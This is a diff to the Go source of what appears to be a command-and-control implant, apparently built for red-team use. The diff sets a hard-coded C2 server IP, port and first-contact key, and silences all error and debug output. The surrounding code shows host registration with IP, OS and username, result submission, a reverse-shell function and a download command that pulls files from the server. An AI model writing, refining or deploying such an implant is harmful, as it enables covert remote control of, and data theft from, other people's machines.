@@ -8,7 +8,6 @@ package main
 
 import (
 	"encoding/json"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"net"
@@ -22,9 +21,9 @@ import (
 )
 
 // Global Variable Declaration
-var SERVERIP string = "localhost"
+var SERVERIP string = "192.168.204.128"
 var PORT string = "5000"
-var FIRSTCONTACTKEY string = "firstcontactkey"
+var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
 var URL string = "http://" + SERVERIP + ":" + PORT
 
 func GetOutboundIP() string {
@@ -42,7 +41,7 @@ func simplePost(endpoint string, data url.Values) map[string]interface{} {
 	response, err := http.PostForm(endpoint, data)
 
 	if err != nil {
-		fmt.Println("[-] Error: ", err)
+		//fmt.Println("[-] Error: ", err)
 		os.Exit(1)
 	}
 
@@ -50,7 +49,7 @@ func simplePost(endpoint string, data url.Values) map[string]interface{} {
 	body, err := ioutil.ReadAll(response.Body)
 
 	if err != nil {
-		fmt.Println("[-] Error:", err)
+		//fmt.Println("[-] Error:", err)
 		os.Exit(1)
 	}
 
@@ -91,7 +90,7 @@ func register(registerkey string, ip string, os_name string, user string) bool {
 	if jsonData["result"] == "success" {
 		return true
 	} else {
-		fmt.Println(jsonData["error"])
+		//fmt.Println(jsonData["error"])
 		return false
 	}
 }
@@ -142,8 +141,8 @@ func submitResult(registerkey string, ip string, result string) {
 		"registerkey": {registerkey},
 		"result":      {result}}
 
-	jsonData := simplePost(endpoint, data)
-	fmt.Println(jsonData)
+	simplePost(endpoint, data)
+	//fmt.Println(jsonData)
 }
 
 func reverseshell(serverip string, port string) {
@@ -190,7 +189,6 @@ func executeCommand(command string) string {
 
 	// Download file and save it into the local disk
 	if commandSlice[0] == "download" {
-		fmt.Println("implement download here ")
 		endpoint := URL + "/download/" + commandSlice[1]
 		download(endpoint, commandSlice[2])
 		return ""
@@ -218,7 +216,7 @@ func main() {
 	username := user.Username
 
 	registerkey := firstContact()
-	fmt.Println("Reigster key = ", registerkey)
+	//fmt.Println("Reigster key = ", registerkey)
 
 	register_result := register(registerkey, ip, os_name, username)
 
